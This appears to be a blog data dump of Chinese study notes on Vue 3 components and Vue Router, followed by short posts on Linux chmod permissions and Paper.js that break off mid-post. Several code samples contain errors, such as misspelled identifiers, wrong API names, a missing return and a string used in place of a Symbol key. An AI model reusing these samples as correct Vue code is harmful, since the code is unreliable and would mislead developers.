插槽父组件可通过插横向子组件传递内容；插槽从某种意义上来说，有点像是一个形式参数。子组件本身只提供样式，内容则由参数来决定，这样可以提高子组件的通用性和灵活性； 12345&lt;!-- 父组件 --&gt;&lt;FancyButton&gt; &lt;span style=&quot;color: red&quot;&gt;Click me!&lt;/span&gt; &lt;AwesomeIcon name=&quot;plus&quot; /&gt;&lt;/FancyButton&gt; 1234&lt;!-- 子组件 FancyButton.vue --&gt;&lt;button class=&quot;fancy-btn&quot;&gt; &lt;slot&gt;&lt;/slot&gt; &lt;!-- 插入的位置 --&gt;&lt;/button&gt; 12345&lt;!-- 最终渲染结果 --&gt;&lt;button class=&quot;fancy-btn&quot;&gt; &lt;span style=&quot;color: red&quot;&gt;Click me!&lt;/span&gt; &lt;AwesomeIcon name=&quot;plus&quot; /&gt;&lt;/button&gt; 作用域：插槽内容可以访问父组件中定义的变量，但无法访问子组件中的数据； 默认内容：插槽允许指定默认内容，这样当父组件没有传入内容时，可显示默认内容；就像默认参数值一样； 12345&lt;button type=&quot;submit&quot;&gt; &lt;slot&gt; Submit &lt;!-- 此处的 Submit 为默认内容 --&gt; &lt;/slot&gt;&lt;/button&gt; 具名插槽组件支持多个插槽，为了避免混淆，需要为每个插槽指定名称，这样传入内容的时候，才能够匹配； 123456789101112&lt;!-- 子组件 BaseLayout.vue --&gt;&lt;div class=&quot;container&quot;&gt; &lt;header&gt; &lt;slot name=&quot;header&quot;&gt;&lt;/slot&gt; &lt;/header&gt; &lt;main&gt; &lt;slot&gt;&lt;/slot&gt; &lt;!-- 没有名称，默认名称为 default --&gt; &lt;/main&gt; &lt;footer&gt; &lt;slot name=&quot;footer&quot;&gt;&lt;/slot&gt; &lt;/footer&gt;&lt;/div&gt; 123456789&lt;!-- 父组件 --&gt;&lt;BaseLayout&gt; &lt;template v-slot=&quot;header&quot;&gt; &lt;!-- 此处的内容将匹配到名称为 header 的插槽上 --&gt; &lt;/template&gt; &lt;template #footer&gt; &lt;!-- v-slot 支持简写为 # --&gt; &lt;!-- 此处的内容将匹配到名称为 footer 的插槽上 --&gt; &lt;/template&gt;&lt;/BaseLayout&gt; 父组件的插槽名称必须和子组件中的插槽名称完全一样，如果不一样，会无法匹配，因此也无法渲染 插槽的名称可以是动态的 123&lt;base-layout&gt; &lt;template v-slot:[dynamicSlotName]&gt;&lt;/template&gt;&lt;/base-layout&gt; 反向传递子组件可以将自己的数据，通过插槽，反向传递给父组件 无渲染组件利用插槽机制，再加上 v-slot 让子组件能够向父组件传递数据，那么接下来便出现了一种有趣的用法，即子组件只封装了逻辑，但没有封装要渲染的内容。它在通过逻辑获得数据后，可以将数据传递给父组件，由父组件自行决定如何渲染； 依赖注入当需要向深层次的组件时，使用 props 会导致逐级透传的问题 Vue 使用 provide&#x2F;inject 机制来解决逐级透传的问题 1234567&lt;script setup&gt; import &#123; provide &#125; from &#x27;vue&#x27;; provide(&#123; &#x27;message&#x27;, &#x27;hello&#x27;&#125;) // 此处 message 是键，hello 是值； const count = ref(0); provide(&#x27;count&#x27;, count); // provide 支持多次调用，以便传入多个值&lt;/script&gt; app 可以提供全局依赖&#x2F;注入 12345import &#123; createApp &#125; from &#x27;vue&#x27;const app = createApp(&#123;&#125;);app.provide(&quot;message&quot;, &quot;hello&quot;); 在子组件中，使用 inject 来获得想要的数据 1234567891011&lt;!-- 子组件 --&gt;&lt;script setup&gt; import &#123; inject &#125; from &#x27;vue&#x27; const message = inject(&quot;message&quot;); // 使用 inject 获得想要的数据 const value = inject(&quot;count&quot;, &quot;defaultValue&quot;) // inject 支持设置一个默认值 // 默认值也可以使用工厂函数来生成, 第三个参数 true 用来声明默认值是由一个函数生成 const value = inject(&quot;key&quot;, () =&gt; new DefautlValue(), true);&lt;/script&gt; 如果需要在子组件中更改注入的数据，那么 provide 最好提供一个方法，供子组件调用，而不是直接修改。这样有利于未来的维护； 1234567891011121314&lt;script setup&gt; import &#123; ref, provide &#125; from &#x27;vue&#x27; const location = ref(&quot;North Pole&quot;); function updateLocation() &#123; location.value = &#x27;South Pole&#x27;; &#125; provide(&quot;location&quot;, &#123; location, updateLocation, &#125;)&lt;/script&gt; 123456789101112&lt;!-- 子组件 --&gt;&lt;script setup&gt; import &#123; inject &#125; from &#x27;vue&#x27; const &#123; location, updateLocation &#125; = inject(&quot;location&quot;); // 可以解包&lt;/script&gt;&lt;template&gt; &lt;button @click=&quot;updateLocation&quot;&gt; &#123;&#123; location &#125;&#125; &lt;/button&gt;&lt;/template&gt; 如果提供方想保护自己的数据不能被修改，可以使用 readonly 将其装饰为只读的状态 1234567&lt;script setup&gt; import &#123; ref, provide, readonly &#125; from &#x27;vue&#x27; const count = ref(0) provide(&#x27;readOnlyCount&#x27;, readonly(count)) // 使用 readonly 装饰&lt;/script&gt; 使用 Symbol 避免命名冲突如果构建的应用很大，或者所编写的组件会被很多人调用，那么有可能产生命名冲突。解决办法就是将名称放在一个单独的文件中统一管理 12// key.jsexport const myInjectKey = Symbol(); // Symbol 会生成一个唯一值，以便作为标识符，避免重名 12345// 在 provide 组件中import &#123; provide &#125; from &#x27;vue&#x27;import &#123; myIndectKey &#125; from &quot;./key.js&quot;provide(myInjectKey, &#123;/* something */&#125;) 12345// 在 inject 组件中import &#123; inject &#125; from &#x27;vue&#x27;import &#123; myInjectKey &#125; from &quot;./key.js&quot;const injected = inject(&quot;myInjectKey&quot;); 异步组件当应用变得很大时，每次打开便加载所有组件将耗费很长的等待时间，更好的做法是懒加载，即等用到某个组件时，再去加载它； 123456789// 普通加截组件的方法import MyComponet from &quot;./components/MyComponent.vue&quot;// 异步加载组件的方法import &#123; defineAsyncComponent &#125; from &#x27;vue&#x27;const AsyncComp = defineAsyncComponent(() =&gt; &#123; import(&quot;./components/MyComponent.vue&quot;)&#125;) 加载错误异步加载因为是使用时再加载的，那么有可能因为网络信号不好，导致加载失败，此时可提供一个组件，来应对出错的情况，defineAsyncComponent 支持多个配置选项 1234567const AsyncComp = defineAsyncComponent(&#123; loader: () =&gt; import(&quot;../components/Foo.vue&quot;), loadingComponent: LoadingComponent, // 例如可显示加载动画 errComponent: ErrorComponent, // 例如在出错时，显示错误提示信息 delay: 200, // 设置延迟，有助于让画面过渡更加顺滑，以免加载太快，切换太快，像是页面闪烁 timeout: 3000, // 超时后报错&#125;) 逻辑复用组合式函数当某个行为逻辑被很多个组件复用时，可以把它抽象到一个公式的函数中，然后由各组件引入使用； 1234567891011121314151617181920212223// 该函数实时读取鼠标的位置，现抽象到单独的 mouse.js 文件中import &#123; ref, onMounted, onUnmounted &#125; from &#x27;vue&#x27;// 按照惯例，组合式函数名以“use”开头export function useMouse() &#123; // 被组合式函数封装和管理的状态 const x = ref(0) const y = ref(0) // 组合式函数可以随时更改其状态。 function update(event) &#123; x.value = event.pageX y.value = event.pageY &#125; // 一个组合式函数也可以挂靠在所属组件的生命周期上 // 来启动和卸载副作用 onMounted(() =&gt; window.addEventListener(&#x27;mousemove&#x27;, update)) onUnmounted(() =&gt; window.removeEventListener(&#x27;mousemove&#x27;, update)) // 通过返回值暴露所管理的状态 return &#123; x, y &#125;&#125; 12345&lt;!-- 在组件中使用 mouse.js --&gt;&lt;Script setup&gt; import &#123; useMouse &#125; from &quot;./mouse.js const &#123; x, y &#125; = useMouse(); // useMouse 会创建单独的实例，因此各个组件间的状态不会相互影响&lt;/Script&gt; 我们可以将动作拆分成更小的函数，然后不同的函数可以相互组合，这样可以尽可能实现复用； 例如从后端获取数据是一个很常见的动作，获取的过程涉及三个动作，显示正在获取中；如果成功，显示数据；如果失败，显示失败提示；由于该动作很常见，因此我们可以将它封装成一个单独的函数，以便各个组件可以复用该逻辑； 123456789101112131415161718192021&lt;!-- 传统的方式 --&gt;&lt;script setup&gt;import &#123; ref &#125; from &#x27;vue&#x27;const data = ref(null)const error = ref(null)fetch(&#x27;...&#x27;) .then((res) =&gt; res.json()) .then((json) =&gt; (data.value = json)) .catch((err) =&gt; (error.value = err))&lt;/script&gt;&lt;template&gt; &lt;div v-if=&quot;error&quot;&gt;Oops! Error encountered: &#123;&#123; error.message &#125;&#125;&lt;/div&gt; &lt;div v-else-if=&quot;data&quot;&gt; Data loaded: &lt;pre&gt;&#123;&#123; data &#125;&#125;&lt;/pre&gt; &lt;/div&gt; &lt;div v-else&gt;Loading...&lt;/div&gt;&lt;/template&gt; 123456789101112131415// 抽象成单独的函数// fetch.jsimport &#123; ref &#125; from &#x27;vue&#x27;export function useFetch(url) &#123; const data = ref(null) const error = ref(null) fetch(url) .then((res) =&gt; res.json()) .then((json) =&gt; (data.value = json)) .catch((err) =&gt; (error.value = err)) return &#123; data, error &#125;&#125; 123456&lt;!-- 使用封装后的函数 --&gt;&lt;script setup&gt;import &#123; useFetch &#125; from &#x27;./fetch.js&#x27;const &#123; data, error &#125; = useFetch(&#x27;...&#x27;)&lt;/script&gt; 理论上也可以直接使用普通的函数，没有必要将函数封装组装，这种做的好处其实在于让它变成响应式的。因为普通的函数每次执行，都需要手动主动调用。而如果封装成了组件，同时参数为 ref 或者 getter 函数等动态类型，那么每当参数值发生变化时，组件就会自动运行。这是相对普通函数的好处； 123456const url = ref(&#x27;/initial-url&#x27;)const &#123; data, error &#125; = useFetch(url)// 这将会重新触发 fetchurl.value = &#x27;/new-url&#x27; 另外，也可以在函数式组件中使用 watchEffect 来监听参数变化； 123456789101112131415161718192021222324// fetch.jsimport &#123; ref, watchEffect, toValue &#125; from &#x27;vue&#x27;export function useFetch(url) &#123; const data = ref(null) const error = ref(null) const fetchData = () =&gt; &#123; // 每次运行前重置 data.value = null error.value = null fetch(toValue(url)) // toValue 的好处是让参数可以支持多种类型，更加灵活 .then((res) =&gt; res.json()) .then((json) =&gt; (data.value = json)) .catch((err) =&gt; (error.value = err)) &#125; watchEffect(() =&gt; &#123; // 使用 watchEffect 来监听变化 fetchData() &#125;) return &#123; data, error &#125;&#125; 解构重命名 1234567const obj = &#123; a: 1, b: 2, c: 3,&#125;const &#123;a : a1, b : b2, c: c3, d4 = &#x27;default&#x27;&#125; = obj; 自定义指令Vue 有一些内置的指令，例如 v-model、v-show 等，这些指令从本质上来，其实是为了操作和控制 DOM；除了内置指令，Vue 也支持编写自定义的指令，这些指令可以在不同的组件上实现复用； 123456789&lt;script setup&gt;const vFocus = &#123; mounted: (el) =&gt; el.focus(), // 加载后，可自动对焦&#125;&lt;/script&gt;&lt;template&gt; &lt;input v-focus /&gt;&lt;/template&gt; vFocus 是一种强制的命名规范，以小写字母 v 开头； 指令支持多种钩子函数 12345678910111213const myDirective = &#123; created(el, binding, vnode)&#123;&#125;, beforeMount(el, binding, vnode)&#123;&#125;, mounted(el, binding, vnode)&#123;&#125;, beforeUpdated(el, binding, vnode)&#123;&#125;, updated(el, binding, vnode)&#123;&#125;, beforeUnmounted(el, binding, vnode)&#123;&#125; unmounted(el, binding, vnode)&#123;&#125;&#125;// el 参数指要操作的元素// binding 是一个对象，主要用来存放要传给指令的值；以便 el 可以读取这些值，进行相应的操作；// vnode 代表绑定元素的底层 VNode// prevVnode 代表之前绑定的底层 VNode 注：应避免有组件上面使用自定义指令，而是只在原生的 HTML 元素上使用，以避免冲突，产生预期外的效果； 插件插件可用来给 Vue 添加全局功能； 12345import &#123; createApp &#125; from &#x27;vue&#x27;const app = createApp();app.use(myPlugin), &#123;...&#125;; // 全局使用插件 12345678// 定义插件示例const myPlugin = &#123; install: (app, options) &#123;...&#125;,&#125;// 或者const myPlugin = (app, options) =&gt; &#123;&#125; 编写插件示例该插件给在 app 上注册一个全局可用的 $translate 函数，用来翻译指定字段 123456789101112// plugins/i18n.jsexport default &#123; install: (app, options) =&gt; &#123; app.config.globalProperties.$translate = (key) =&gt; &#123; return key.split(&quot;.&quot;).reduce((0, i) =&gt; &#123; if (o) &#123; return o[i]; &#125; &#125;, options); &#125; &#125;&#125; 12345678// 引入插件import i18nPlugin from &quot;./plugins/i18n&quot;;app.use(i18nPlugin, &#123; greetings: &#123; hello: &quot;Bonjour!&quot;, &#125;&#125;) 12&lt;!-- 使用插件 --&gt;&lt;h1&gt;&#123;&#123; $translate(&quot;greetings.hello&quot;)&#125;&#125;&lt;/h1&gt; 插件中也可以引入 provide &#x2F; inject，这样各个组件就可以直接读取插件提供的值了 12345export default &#123; install: (app, options) =&gt; &#123; app.provide(&#x27;i18n&#x27;, options), &#125;&#125; 123456&lt;!-- 在组件中通过 inject 读取 options --&gt;&lt;script setup&gt; import &#123; inject &#125; from &#x27;vue&#x27;; const i18n = inject(&#x27;i18n&#x27;); console.log(i18n.greetings.hello);&lt;/script&gt; 内置组件Transition内置的 Transition 组件，可用来给组件加载或卸载时提供动画效果； 1234&lt;button @click=&quot;show =!show&quot;&gt;Toggle&lt;/button&gt;&lt;Transition&gt; &lt;p v-if=&quot;show&quot;&gt;hello&lt;/p&gt;&lt;/Transition&gt; 动画效果可以自定义，并且可以命名，以方便管理多种不同的动画效果； TransitionGroup 可用来设置列表的动画，当列表添加或删除元素时，呈现动画效果； KeepAliveKeepAlive 可用来缓存实例 TeleportTeleport 有点像是一个传送门，用来将组件中的部分模板，传送到外部组件上面；之所以这么做，是为了能够更好的展示传送的内容，避免受到深层嵌套过程中的其他组件的布局影响； 12345678&lt;button @click=&quot;open = true&quot;&gt;Open Modal&lt;/button&gt;&lt;Teleport to=&quot;body&quot;&gt; &lt;div v-if=&quot;open&quot; class=&quot;model&quot;&gt; &lt;p&gt;Hello from the modal&lt;/p&gt; &lt;button @click=&quot;open = false&quot;&gt;Close&lt;/button&gt; &lt;/div&gt;&lt;/Teleport&gt; Teleport 会改变 DOM 的层级关系，但不会改组件之间的层级关系； Suspence在某个组件内部存在多个异步组件时，有可能这些异步组件都有自己的异步处理机制，例如显示加载图标。当这些子组件同时加载时，会导致页面上出现多个异步图标。Suspence 的目标是对这些异步状态统一管理，展示统一的加载状态； 应用规模化单文件组件一个 Vue 文件同时包含 js、html 和 css 三部分内容，即同时包含逻辑、模板和样式数据； 单文件组件是一种代码的组织方式，如果需要实现的功能非常小，例如只是给静态文件添加一些简单的交互，则可以考虑使用 petite-vue，只有 6k 大小； 路由非常简单的页面，可用 computed 配合监听浏览器的 haschange 来切面页面；它的原理很简单，即 js 代码调用浏览器的接口，更新了 url，触发了 haschange 事件，从而调用监听函数，完成组件的更新，实现页面的切换； 正式的路由器则使用 Vue Router 状态管理如果多个组件依赖同一份数据，那么使用 props 逐级透传的方式，会让代码变得臃肿。解决办法是将数据封装成一个全局的单例，供各个组件使用； 其中一个方案是使用 reactive、ref、computed 或者组合式函数，创建一个响应式对象，放在单独的文件中，供各个组件引用； 如果应用使用服务器渲染，则以上方案变得不太可行；此时需要使用单独的状态管理器，例如 Pinia 或者 Vuex； 测试需要测试的东西： 单元测试：确保函数正常 组件测试：确保 component 的功能正常 端到端测试：类似于集合测试，确保整个应用正常运行；常用框架：Cypress，Playwright，Nightwatch 等； 其中端到端是最重要的，因为它确保了应用程序的运行正常； 服务端渲染有两种场景需要用到服务端渲染 SSR： SEO 非常重要； 首页加载速度非常重要； 最佳实践生产部署在生产服务器部署，那些提高开发效率的工具就不需要了，因此记得在打包代码是地，排除它们，以缩小文件的体积； 性能优化Vue 本身包含了优化功能，在绝大部分场景下，vue 的性能都是够用的，除非遇到一些极端的场景，才需要手动优化； 两个常见的优化指标： 页面加载速度 页面更新速度 页面加载优化常用的手段包括： 服务端渲染 减小包体积：例如构建工具使用 Tree Shaking，预编译等，避免引入太大的依赖； 代码分割：实现懒加载； 页面更新优化当 props 变更时，会触发组件的更新，因此，在设计组件时，应该确保它的 props 值尽量稳定，以减少不必要的更新触发； v-once 指令可用来标识无需更新的组件，这样进行更新计算时，会跳过该组件； v-memo 指令可用来设置更新的条件； computed 的计算结果如果发生变化，也会触发更新。 如果是值还好说，可直接比较；如果比较的是对象，那么即使值没有变化，也会触发更新；此时可考虑引入自定义的比较函数； 通用优化 大型列表的虚拟化； 绕开深层级对象的深度检查； 在大型列表中，减少不必要的组件抽象； 进阶使用 Vue 的多种方式 独立脚本，像引入 jQuery 一样轻量化使用； 作为 Web Component 嵌入原有的旧应用； 单页面应用：主流用法； 全栈 &#x2F; SSR：适用于 SEO 很重要的场景； 静态 SSG：静态站点生成 JAMStack，作用静态文件部署；","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"}]},{"title":"Vue Router 基本用法","slug":"Vue Router 基本用法","date":"2023-08-18T12:26:00.000Z","updated":"2024-09-21T07:15:45.327Z","comments":true,"path":"2023/08/18/Vue Router 基本用法/","permalink":"http://example.com/2023/08/18/Vue%20Router%20%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/","excerpt":"","text":"基础入门路由的目的是建立 url 和组件之间的映射关系；当 url 发生变化时，组件也随之更新； 创建路由器实例1234567891011121314import &#123; createMemoryHistory, createRouter &#125; from &quot;vue-router&quot;import HomeView from &#x27;./HomeView.vue&#x27;import AboutView from &#x27;./AboutView.vue&#x27;const routes = [ &#123; path: &#x27;/&#x27;, component: Homeview &#125;, &#123; path: &#x27;/about&#x27;, component: AboutView &#125;,]const router = createRouter(&#123; history: createMemoryHistory(), routes,&#125;) history 用来记录 url 和路由的双向映射，这里用的是 createMemoryHistory，它会抛开浏览器的 url，完全自我管理； 如果想要跟浏览器的 url 保持关系，则可使用 createWebHistory 或者 createWebhashHistory； 注册路由器插件创建好路由器实例化，可以用 app.use(router) 将其注册为插件； 123const app = createApp();app.use(router);app.mount(&quot;#app&quot;) 注册该插件后，会完成以下几项工作： 注册需要的组件，如 RouterLink 和 RouterView 添加全局属性，如 $router 和 $route 添加全局组合式函数 useRouter 和 useRoute 解析初始路由 访问路由器和当前路由在组合式 API 中，可使用 useRouter 和 useRoute 来访问路由器和当前路由； 动态路由匹配动态匹配：用于将多个路径匹配到同一个组件 123456import User from &quot;./User.vue&quot;const routers = &#123; // 动态参数使用冒号 : 来标识 &#123; path: &quot;/users/:id&quot;, component: User &#125;,&#125; 可在模板中使用 $route 或者 useRoute 来访问当前路径的参数，例如 $route.params.id 12345&lt;template&gt; &lt;div&gt; User &#123;&#123; $route.params.id &#125;&#125; &lt;/div&gt;&lt;/template&gt; 路由支持多个参数，例如 &#x2F;users&#x2F;:name&#x2F;posts&#x2F;:postId 响应路由参数的变化当路由参数出现变化时，为提高性能，避免重新渲染，会直接复用原先的组件。这意味着组件不会重新创建，因此跟创建有关的 hook 函数例如 onMount 也不会重新执行； 可使用 watch 或者 onBeforeRouteUpdated 来监听变化，并执行相关的操作； 12345678&lt;script setup&gt; import &#123; watch &#125; from &#x27;vue&#x27; import &#123; useRoute &#125; from &#x27;vue-router&#x27; const route = useRoute() watch(() =&gt; route.params.id, (newId, oldId) =&gt; &#123;...&#125;)&lt;/script&gt; 1234567&lt;script setup&gt; import &#123; onBeforeRouteUpdated &#125; from &#x27;vue-router&#x27; onBeforeRouteUpdated(async(to, from) =&gt; &#123; userData.value = await fetchUser(to.params.id); &#125;)&lt;/script&gt; 捕获所有路由通过路径参数的正则表达式，可以匹配任意的路由 1234const routes = [ &#123; path: &#x27;/:pathMatch(.*)*&#x27;, name: &#x27;NotFound&#x27;, component: NotFound&#125;, &#123; path: &#x27;/user-:afteruser(.*)&#x27;, component: UserGeneric &#125;,] 路由的匹配语法在参数中自定义正则当两个路径的前缀相同，只是参数的类型不同时，可使用正则来区分它们； 12345const routes = [ // 仅匹配数字 &#123; path: &#x27;/:orderId(\\\\d+)&#x27; &#125;, &#123; path: &#x27;/:productName&#x27; &#125;] 但我个人觉得更好的做法是修改前缀，这样更简单清晰 1234const routes = [ &#123; path: &#x27;/order/:orderId&#x27; &#125;, &#123; path: &#x27;/product/:name&#x27; &#125;,] 可重复的参数星号 * 表示 0 个或多个 加号 + 表示 1 个或多个 123456const routes = [ // 匹配 /one, /one/two, /one/two/three &#123; path: &#x27;/:chapters+&#x27; &#125;, // 匹配 /, /one, /one/two 等 &#123; path: &#x27;/:chapters*&#x27;&#125;] Sensitive 与 Strict 路由配置默认情况下，路由是不区分大小写的，如需要区分，可添加 sensitive: true 和 strict: true 选项 可选参数修饰符 ? 可用来标记可选参数，即 0 个或者 1 个； 123456const routes = [ // 匹配 /users 和 /users/abc &#123; path: &#x27;/users/:userId?&#x27; &#125;, // 匹配 /users 和 /users/123 &#123; path: &#x27;/users/:userId(\\\\d+)&#x27; &#125;] 嵌套路由组件通常是嵌套的，这种嵌套关系也可以反映在 URL 上面。此时，可在路由中配置 children 子路由来标记这种嵌套关系 1234567891011121314151617181920212223const routes = [ &#123; path: &#x27;/user/:userId&#x27;, component: User, children: [ &#123; // 匹配 /user/:id/profile path: &#x27;profile&#x27;, component: UserProfile &#125;, &#123; // 匹配 /user/:id/posts path: &quot;posts&quot;, component: &quot;UserPosts&quot; &#125;, &#123; // 匹配 /user/:id path: &quot;&quot;, component: UserHome &#125; ] &#125;] 命名路由路由支持命名，只需将名称备注在 name 字段中即可； 1234567const routes = [ &#123; path: &quot;/user/:username&quot;, name: &#x27;profile&#x27;, component: User &#125;] 该名称可用于 router-link 中 1&lt;router-link :to=&quot;&#123; name: &#x27;profile&#x27; params: &#123; username: &#x27;erina&#x27; &#125; &#125;&quot;&gt;&lt;/router-link&gt; 建议使用命名路由，一来这样更方便维护，避免后续因为更改路径，导致很多地方需要跟着改动；二来好的名称也比路径也更容易理解； 路由的命名需要全局唯一，不然会出现冲突； 编程式导航导航到不同的位置router.push(…) 会跳转到新的页面，它同时会向页面 history 的栈中添加记录，这样当用户点击浏览器上面的按钮时，就会返回上一页； 点击 router-link 组件也会有相同的效果； 1&lt;router-link :to=&quot;...&quot;&gt;&lt;/router-link&gt; router.push 可以支持很多种格式，其参数可以是简单的 url，也可以是一个对象； 1234567891011121314// 字符串路径router.push(&#x27;/users/eduardo&#x27;)// 带有路径的对象router.push(&#123; path: &#x27;/users/eduardo&#x27; &#125;)// 命名的路由，并加上参数，让路由建立 urlrouter.push(&#123; name: &#x27;user&#x27;, params: &#123; username: &#x27;eduardo&#x27; &#125; &#125;)// 带查询参数，结果是 /register?plan=privaterouter.push(&#123; path: &#x27;/register&#x27;, query: &#123; plan: &#x27;private&#x27; &#125; &#125;)// 带 hash，结果是 /about#teamrouter.push(&#123; path: &#x27;/about&#x27;, hash: &#x27;#team&#x27; &#125;) 替换当前位置router.replace 会跳转新页面，作用与 router.push 相同，区别是直接替换当前路由在 history 中的位置，而不是 push； 横跨历史在 history 栈中进行跳转，类似 window.history.go(n) 1234router.go(1) // 前进1页，与 router.forward 作用相同router.go(-1) // 后退1页，与 router.back 作用相同router.go(3) // 前进3页router.go(-3) // 后退3页 命名视图给视图进行命名，可以让它们同时同级展示，而不是嵌套展示 123&lt;router-view name=&quot;leftSidebar&quot; /&gt;&lt;router-view /&gt; &lt;!-- 没有名称，默认为 default --&gt;&lt;router-view name=&quot;rightSidebar&quot; /&gt; 当页面上存在多个视图时，需要给各视图映射相应的组件； 12345678910111213const router = (&#123; history: createWebHashHistory(), routes: [ &#123; path: &quot;/&quot;, components: &#123; default: Home, leftSidebar: LeftSidebar, rightSidebar: RightSidebar, &#125; &#125; ]&#125;) 命名视图也是支持嵌套滴； 重定向和别名重定向重写向：点击 A 路径，重定向跳转到 B 路径 12345678910111213141516171819// 可以是 urlconst routes = [&#123; path: &quot;/home&quot;, redirect: &quot;/&quot; &#125;]// 或者一个对象const routes = [ &#123; path: &quot;/home&quot;, redirect: &#123; name: &quot;homepage&quot; &#125; &#125;]// 或者一个函数const routes = [ &#123; path: &#x27;/search/:searchText&#x27;, redirect: to =&gt; &#123; return &#123; path: &#x27;/search&#x27;, query: &#123; q: to.params.searchText &#125; &#125; &#125; &#125;] 相对重定向12345678const routes = [ &#123; path: &#x27;/users/:userId/posts&#x27;, redirect: to =&gt; &#123; return &#x27;profile&#x27; // 实际结果为 /users/:userId/profile &#125; &#125;] 别名通过别名，可将任意指定的 url 匹配到相应的组件，而不会受到嵌套结构的限制； 路由组件传参如果在组件中读取 $route 的参数，那么意味着使用该组件，将会与 url 强绑定；组件的复用范围受到了很大的限制；解决方法就是不使用 $route，而是给组件传递参数； 123456&lt;!-- 传统的写法，组件与url紧密耦合 --&gt;&lt;template&gt; &lt;div&gt; User &#123;&#123; $route.params.id&#125;&#125; &lt;/div&gt;&lt;/template&gt; 123456789101112&lt;!-- 新的写法, id 引用 props，由外部传入，而不是读取路由 --&gt;&lt;script setup&gt;defineProps(&#123; id: String, // 声明 props 参数&#125;)&lt;/script&gt;&lt;template&gt; &lt;div&gt; User &#123;&#123; id &#125;&#125; &lt;/div&gt;&lt;/template&gt; 1234// 在路由配置中，通过 props:true 选项将 params 声明为 propsconst routes = [ &#123; path: &quot;/user/:id&quot;, component: User, props: true &#125;] 如果路由映射了多个命名视图，那么需要为每个视图单独备注是否启用 props 12345678910const routes = [ &#123; path: &quot;/user/:id&quot;, components: &#123; default: User, sidebar: Sidebar &#125;, props: &#123; default: true, // 启用 sidebar: false, // 不启用 &#125; &#125;] 另外 props 还支持对象或函数类型； 匹配当前路由的链接有时候多个 router-link 在页面上面会以列表的形式出现，此时经常用不同的颜色，来标识当前激活的 link； 此时需要有一个方法来判断当前处于激活状态的是哪个链接； 不同的历史记录模式有三种历史模式 Hash 模式：会在 URL 上面添加 # 符号，好处是用户重新刷新页面也不要紧，能够正常处理； HTML 模式：URL 跟普通网页的 URL 一模一样，缺点当用户刷新时，会向服务器发送页面请求，需要服务器有相应的处理，不然会出现 404 Memory 模式：URL 只保存在内存，不在浏览器的 URL 上面体现，缺点是无法使用浏览器的前进和后退，因为没有页面栈；","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"}]},{"title":"Linux 文件权限","slug":"Linux 文件权限","date":"2023-08-04T02:09:00.000Z","updated":"2024-09-21T04:34:48.959Z","comments":true,"path":"2023/08/04/Linux 文件权限/","permalink":"http://example.com/2023/08/04/Linux%20%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90/","excerpt":"","text":"drwxrwxrwx d 表示目录 剩下的三组 rwx 分别表示拥有者、拥有者用户组、其他用户对当前文件夹的权限情况 添加权限使用加号 + 减少权限使用减号 - 12345678chmod g+rwx,u+w,o+x &lt;file&gt;# 以上命令的意思是# g+rwx，为用户组增加 rwx 权限# u+w，为用户增加 w 权限# o+x，为其他用户增加 x 权限chmod a-rwx &lt;file&gt;# a 表示所有三个分组（即拥有者、用户组、其他用户），都取消 rwx 权限 rwx 除了用字母外，也可以用数字来表示，rwx 对应的数字分别是 4、2、1 rwxrwxrwx 可以用 777 来表示，因为 rwx 三个数字相加，刚好等于 7，有三组的 rwx，因此有 3 个 7 rwx—— 可以用 700 来表示 r—w—x 可以用 421 来表示 rw-rw-r-x 可以用 665 来表示 本质上来说，数字只是对字母的一种缩写，一种快捷方式，但它也增加了理解的成本； 如果要将 chmod 运用于所用子目录，可以添加 -R 参数，示例如下： 1chmod -R 777 &lt;file&gt;","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"服务器","slug":"服务器","permalink":"http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"}]},{"title":"Paperjs","slug":"Paperjs","date":"2023-07-30T03:49:00.000Z","updated":"2024-09-21T06:46:58.703Z","comments":true,"path":"2023/07/30/Paperjs/","permalink":"http://example.com/2023/07/30/Paperjs/","excerpt":"","text":"Paperjs 是一个较流行的 canvas 接口封装库，可以很方便的用来实现绘图功能，基本概念如下： GeometryPoint, Size, RectanglePoint：点，本质上是点的属性描述 123var myPt = new Point(10, 20) // 10,20 分别表示 x,y 坐标// 除了用 X,Y 参数实例化一个点之外，还可以通过传入其他点作为参数来实例化（本质上是复制，彼此后续的改变是独立的，不会相互影响）// 另外也可以调用旧点的 clone() 方法来实现复制 Size：尺寸，用来表示宽度和高度 12var mySize = new Size(10, 20); // 表示宽度 width 为 10, 高度 height 为 20console.log(mySize); // &#123; width: 0, height: 0 &#125; Rectangle：矩形，有多种实例化的方法（这些方法让我发现，其背后的实现原理很可能是使用数组来存储参数） 1234567891011var myPt = new Point(10, 20);var mySz = new Size(100, 200);var myRect = new Rectangle(myPt, mySz);// 或者var myRect = new Rectangle(10, 20, 100, 200);// 或者var myRect = new Rectangle();myRect.point = new Point(10, 20);myRect.size = new Size(100, 200); Vector矢量是一个非常好用的东西，原因： 它不表示绝对坐标值，而是表示从起点到终点的相对坐标值； 相对坐标的特性，让矢量可以很方便用来做各种计算； 两个矢量可以相加，也可以相减，在几何层面，它们其实仅是方向的区别； 矢量与整数的乘法或除法，也很简单，即相对坐标放大或缩小指定的整数倍数，或者也可以理解为在极坐标中，不改变角度，仅改变矢量长度； 1var newVec = oldVec * 3 // 整数必须写在右边，因为 javascript 解释器默认取左边变量的类型作为计算结果的类型 除了乘法外，也可以通过改变矢量的 length，实现相同的效果 1234var newVec = oldVec * 3// 跟下面的算法等价newVec.length = oldVec.length * 3 矢量拥有角度 angle 属性，可以直接赋值，也可以对其进行计算 1234567var vec = new Vector(100, 100);console.log(vec.angle); // 45// 直接赋值vec.angle = 135;// 或者vec.angle = vec.angle + 90; 加减乘除、旋转等计算并不会改变旧的 vector 属性，而是会直接返回一个新的 vector；但当我们直接修改 vector 的属性时，则会改变 vector 的属性值； Path1234567891011var myPath = new Path();// 顺序添加新的点myPath.add(new Point(0, 0)); myPath.add(new Point(100, 50));// 